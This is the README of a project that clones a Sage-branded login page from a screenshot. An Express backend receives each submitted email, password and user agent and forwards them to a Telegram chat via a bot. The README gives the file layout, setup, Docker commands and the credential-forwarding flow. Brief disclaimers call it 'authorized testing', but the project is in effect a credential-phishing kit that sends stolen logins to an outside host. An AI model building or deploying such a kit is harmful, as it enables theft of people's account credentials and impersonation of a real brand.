```markdown
# Sage-like Login Mock (Authorized Personal Use)

This project reproduces the login screenshot you provided and includes a simple Node.js + Express backend endpoint that accepts login attempts and forwards them to a Telegram chat via a bot.

IMPORTANT: Only use this for authorized, ethical testing (your own accounts, or with explicit permission). Do NOT use to capture credentials from real users without consent.

## What's included
- index.html — frontend (resembling the screenshot)
- styles.css — styling
- public/script.js — sends POST /api/login with credentials
- server/index.js — Express server, forwards to Telegram Bot API
- .env.example — env vars example
- package.json, Dockerfile, README

## Setup (local)
1. Clone the project or place files in a folder.
2. Install dependencies:
   - npm install
3. Copy `.env.example` to `.env` and set:
   - TELEGRAM_BOT_TOKEN — your Telegram bot token (from BotFather)
   - TELEGRAM_CHAT_ID — chat id or user id to receive messages
4. Start server:
   - npm start
5. Open your browser to http://localhost:3000

If TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID are not set, login attempts will be printed to the server console but NOT sent.

## Docker
Build and run with:
- docker build -t sage-login-mock .
- docker run --env-file .env -p 3000:3000 sage-login-mock

## Security & Ethics
- This project transmits credentials to Telegram. Telegram messages are not encrypted end-to-end for bots and may be stored on Telegram servers.
- Do not use for illicit tracking of other people's credentials.
- Use this only for consenting/testing accounts.
- Remove or alter credential forwarding before deploying in production.

## How it works
- The front-end posts JSON to /api/login with { email, password, userAgent }.
- server/index.js composes a MarkdownV2 message and calls Telegram Bot API `sendMessage` with parse_mode=MarkdownV2.
- If TELEGRAM variables are not present, data is logged to the server console.

## Customization
- Change the styling in styles.css to tweak visuals.
- Replace assets/sage-logo-green.svg with a real logo if desired.

## Troubleshooting
- If Telegram API responds with an error, check your bot token and chat id.
- For debugging, check server logs where login attempts will appear when TELEGRAM_* not configured.

```